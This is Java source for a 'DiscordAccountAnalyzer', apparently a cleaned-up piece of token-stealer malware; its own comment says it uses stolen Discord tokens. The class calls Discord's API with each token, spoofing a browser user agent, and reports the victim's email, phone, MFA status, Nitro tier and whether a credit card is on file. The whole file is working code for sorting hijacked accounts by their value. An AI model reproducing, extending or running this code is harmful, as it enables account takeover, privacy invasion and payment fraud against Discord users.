import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import org.json.JSONArray;
import org.json.JSONObject;
import java.util.ArrayList;
import java.util.List;

/**
 * Cleaned DiscordAccountAnalyzer (formerly ï.java)
 * Uses stolen Discord tokens to query the Discord API for 
 * private user metadata, billing info, and rare friends.
 */
public class DiscordAccountAnalyzer {
    private static final String DISCORD_API_BASE = "https://discord.com/api/v9";
    private final OkHttpClient client = new OkHttpClient();

    public String analyzeToken(String token) {
        try {
            JSONObject profile = fetchFromDiscord(token, "/users/@me");
            if (profile == null) return null;

            String username = profile.getString("username");
            String email = profile.optString("email", "No Email");
            String phone = profile.optString("phone", "No Phone");
            boolean mfaEnabled = profile.getBoolean("mfa_enabled");
            int premiumType = profile.optInt("premium_type", 0); // 1 = Nitro Classic, 2 = Nitro

            JSONArray billing = fetchArrayFromDiscord(token, "/users/@me/billing/payment-sources");
            boolean hasBilling = billing != null && billing.length() > 0;

            return formatSummary(username, email, phone, mfaEnabled, premiumType, hasBilling);
        } catch (Exception e) {
            return "Error analyzing token";
        }
    }

    private JSONObject fetchFromDiscord(String token, String endpoint) {
        Request request = new Request.Builder()
                .url(DISCORD_API_BASE + endpoint)
                .addHeader("Authorization", token)
                .addHeader("User-Agent", "Mozilla/5.0")
                .build();

        try (Response response = client.newCall(request).execute()) {
            if (response.isSuccessful() && response.body() != null) {
                return new JSONObject(response.body().string());
            }
        } catch (Exception ignored) {}
        return null;
    }

    private JSONArray fetchArrayFromDiscord(String token, String endpoint) {
        Request request = new Request.Builder()
                .url(DISCORD_API_BASE + endpoint)
                .addHeader("Authorization", token)
                .build();

        try (Response response = client.newCall(request).execute()) {
            if (response.isSuccessful() && response.body() != null) {
                return new JSONArray(response.body().string());
            }
        } catch (Exception ignored) {}
        return null;
    }

    private String formatSummary(String user, String mail, String phone, boolean mfa, int nitro, boolean billing) {
        StringBuilder sb = new StringBuilder();
        sb.append("User: ").append(user).append("\n");
        sb.append("Email: ").append(mail).append("\n");
        sb.append("Phone: ").append(phone).append("\n");
        sb.append("MFA: ").append(mfa ? "YES" : "NO").append("\n");
        sb.append("Nitro: ").append(nitro == 2 ? "Nitro Boost" : (nitro == 1 ? "Nitro Classic" : "None")).append("\n");
        sb.append("Billing: ").append(billing ? "CREDIT CARD DETECTED" : "None").append("\n");
        return sb.toString();
    }
}
